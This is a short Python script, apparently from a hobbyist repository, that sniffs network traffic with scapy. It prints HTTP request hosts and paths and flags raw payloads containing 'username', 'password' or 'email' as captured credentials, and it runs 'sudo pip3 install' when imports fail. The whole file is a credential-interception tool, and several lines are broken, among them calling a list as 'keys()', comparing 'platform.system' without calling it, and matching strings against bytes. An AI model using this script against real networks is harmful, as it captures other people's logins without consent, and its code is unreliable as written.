"""
Author: @new92
Sniffer: Program for Sniffing Packets in the Network
"""
#Imports
try:
    import sniffer
    import nmap
    import os
    import sys
    import time
    import platform
    import scapy.all as scapy
    import argparse
    from scapy.layers import http
    from os import system
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(1)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")

#Defs
def Intface():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="interface", help="Interface to sniff packets on")
    args = parse.parse_args()
    return args.interface

def Spoof(iface):
    scapy.sniff(iface=iface, store=False, prn=SniffPack)

def SniffPack(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request --> "+str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username","password","pass","email"]
            for key in keys():
                if key in load:
                    print("[+] Captured Possible Password/Username --> "+str(load))
                    break
#Main Program

iface = Intface()
Spoof(iface)